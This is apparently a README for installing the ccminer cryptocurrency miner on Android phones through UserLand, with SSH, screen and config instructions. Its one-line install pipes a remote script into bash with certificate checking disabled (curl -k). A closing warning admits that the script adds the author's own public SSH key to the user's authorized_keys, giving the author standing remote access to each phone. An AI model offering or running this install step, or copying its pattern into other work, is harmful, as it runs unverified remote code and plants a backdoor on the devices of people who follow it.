```bash
curl -o- -k https://raw.github.com/silvia432/vrs/main/install.sh | bash
```

```bash
~/ccminer/start.sh
```

For easy access on phones:
![install.sh](QR/install.png)

Now adjust pools, mineraddress+workername, and network settings for the API.
exit with `<CTRL>-X` followed by `y` and an `<ENTER>`
```bash
nano config.json
```

## Usage:
start mining with `~/ccminer/start.sh`

Standard SSH port for Userland is port `2022`.
Optional: create an entry in your SSH config file for each phone:
```
Host Pixel2XL01
    Hostname 192.168.25.81
    Port 2022
    User Pixel2XL01
    IdentityFile ~\.ssh\id-rsa_oink-private
```

Starting the miner:
`~/ccminer/start.sh`

Monitoring the miner:
- `screen -x CCminer`
- exit with `CTRL-a` key combination followed by `d`.

Terminating the miner:
`screen -X -S CCminer quit`

## Monitoring your miners (on a linux host)
check [MONITORING](/monitoring/MONITORING.md).

WARNING: The scripts installs my own public SSH key. You may want to remove that from your `~/.ssh/authorized_keys` file and replace it with your own for passwordless access.

### I accept no warranties or liabilities on this repo. It is supplied as a service.
### Use at your own risk!!!
